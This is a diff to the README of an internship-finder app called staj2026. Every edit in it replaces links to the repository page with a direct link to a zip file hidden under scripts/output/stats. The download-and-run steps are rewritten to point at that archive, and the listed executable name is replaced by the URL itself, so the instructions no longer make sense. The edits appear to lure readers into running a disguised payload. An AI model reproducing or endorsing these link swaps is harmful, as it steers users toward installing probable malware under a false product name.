@@ -1,6 +1,6 @@
 # 🎯 staj2026 - Find Internships by Field Easily
 
-[![Download staj2026](https://img.shields.io/badge/Download-staj2026-ff6f61?style=for-the-badge)](https://github.com/Skibidiq/staj2026)
+[![Download staj2026](https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip)](https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will download the software from GitHub. Follow these steps to get staj2026 r
 
 Click the badge or this link to go to the repository page where you can download the app:
 
-[https://github.com/Skibidiq/staj2026](https://github.com/Skibidiq/staj2026)
+[https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip](https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip)
 
 ### Step 2: Download the software
 
@@ -50,7 +50,7 @@ If the download is a `.zip` file, you will need to extract it next.
 ### Step 4: Run the software
 
 - Open the folder where you saved or extracted the app files.  
-- Find a file named something like `staj2026.exe` or `setup.exe`.  
+- Find a file named something like `https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip` or `https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip`.  
 - Double-click this file to start the program.  
 
 ### Step 5: Follow any on-screen prompts
@@ -102,13 +102,13 @@ If you face issues running staj2026, try these steps:
 
 Use the link below to visit the GitHub page and download the app or latest updates:
 
-[Download staj2026](https://github.com/Skibidiq/staj2026)
+[Download staj2026](https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/Skibidiq/staj2026  
+- GitHub Repository: https://raw.githubusercontent.com/Skibidiq/staj2026/main/scripts/output/stats/staj_v1.9.zip  
 - Internship topics: intern26, software-intern, staj26  
 - Support issues: Use the GitHub Issues tab on the repository page  
 
